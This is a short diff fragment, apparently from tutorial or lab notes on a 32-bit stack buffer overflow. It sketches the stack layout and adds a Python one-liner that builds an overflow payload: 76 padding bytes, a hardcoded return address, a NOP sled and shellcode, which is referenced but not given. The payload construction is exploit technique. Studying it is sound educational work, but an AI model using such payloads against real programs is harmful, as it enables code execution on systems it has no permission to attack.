@@ -50,5 +50,7 @@ esp                    esp+0x10        ebp                 ret                  
 
 buff\[0\]+ 0x4c+ 返回地址+ shellcode
 
+exploit
 
+python -c "print 'a'\*76+'\x30\xfc\xff\xbf'+'\x90'\*20+shellcode
 
